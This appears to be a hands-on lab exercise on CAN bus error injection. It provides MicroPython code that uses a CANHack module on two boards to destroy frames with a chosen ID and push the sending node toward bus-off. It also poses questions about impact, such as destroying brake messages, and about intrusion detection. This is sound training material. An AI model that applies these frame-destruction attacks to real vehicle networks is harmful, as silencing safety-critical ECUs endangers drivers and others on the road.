# Challenge 4: Error Injection Attack
**Difficulty:** 🟡 Medium | **Time:** 30 min | **Boards:** 2

## 🎯 Objective
Inject **error frames** into the CAN bus to corrupt specific frames. Understand CAN error handling (TEC/REC counters) and how attackers exploit it.

## 📖 Background
CAN has built-in error detection. When a node detects an error, it sends a 6-bit dominant **error frame** that destroys the current frame on the bus. The CAN protocol tracks errors with two counters:
- **TEC (Transmit Error Counter):** incremented when a transmit error occurs
- **REC (Receive Error Counter):** incremented when a receive error occurs

When TEC reaches 128, the node enters **error passive** mode. At 256, it goes **bus-off** (completely disconnected). Attackers can exploit this to silence specific ECUs.

## 🔬 Exercise

### Part A: Observe normal error behavior
**Board B — sends periodic frames:**
```python
from rp2 import CAN, CANFrame, CANID
from utime import sleep_ms

c = CAN()

while True:
    f = CANFrame(CANID(0x200), data=b'\x01\x02\x03\x04')
    try:
        c.send_frame(f)
    except Exception as e:
        print(f"Send error: {e}")
    sleep_ms(200)
```

**Board A — monitor and check error counters:**
```python
from rp2 import CAN
c = CAN()

# Check error counters
print(f"TEC: {c.get_tec()}")
print(f"REC: {c.get_rec()}")
print(f"Bus state: {c.get_bus_state()}")
```

### Part B: Inject errors to destroy a specific frame
**Board A — use CANHack to inject errors when ID 0x200 appears:**
```python
from rp2 import CAN, CANHack

c = CAN(tx_open_drain=True)
ch = CANHack()

# Target frame: ID 0x200
ch.set_frame(can_id=0x200, data=bytes([0x01, 0x02, 0x03, 0x04]))
ch.set_attack(can_id=0x200)

# Error attack: inject error after seeing the target frame
# repeat=1 means do it once per target frame seen
# inject_error=True means inject a dominant bit during data/CRC to cause error
print("Waiting for target frame to destroy...")
result = ch.error_attack(repeat=1, inject_error=True)
print(f"Attack result: {result}")
```

### Part C: Watch the error counters climb
**Board B — monitor its own error counters while Board A attacks:**
```python
from rp2 import CAN, CANFrame, CANID
from utime import sleep_ms

c = CAN()

for i in range(50):
    f = CANFrame(CANID(0x200), data=b'\x01\x02\x03\x04')
    try:
        c.send_frame(f)
    except:
        pass
    print(f"[{i:3d}] TEC={c.get_tec():3d}  REC={c.get_rec():3d}  State={c.get_bus_state()}")
    sleep_ms(200)
```

**Questions:**
1. How fast does TEC increase on Board B?
2. At what TEC value does the behavior change?
3. What happens when TEC reaches 128? 256?

### Part D: Selective destruction
Only destroy frames with specific data patterns:
```python
from rp2 import CAN, CANHack

c = CAN(tx_open_drain=True)
ch = CANHack()

# Only attack ID 0x200 — leave other IDs alone
ch.set_frame(can_id=0x200, data=bytes([0x01, 0x02, 0x03, 0x04]))
ch.set_attack(can_id=0x200)

# Destroy 10 consecutive frames
for i in range(10):
    result = ch.error_attack(repeat=1, inject_error=True)
    print(f"Destroyed frame #{i+1}: {result}")
```

**Meanwhile, Board B also sends frames on ID 0x100 — are those affected?**

**Questions:**
1. Can you selectively destroy only one ID while leaving others untouched?
2. What real-world impact would this have? (e.g., destroy only brake messages)
3. How does the CAN controller on Board B react to repeated errors?

## 📝 What to Share
- Error counter progression graph (TEC over time)
- Whether selective destruction works
- Discussion: how could an IDS detect error injection?

## 🏆 Stretch
- [ ] Plot TEC/REC over time as a graph
- [ ] Determine how many error injections it takes to reach bus-off
- [ ] Can you recover a bus-off node? How?
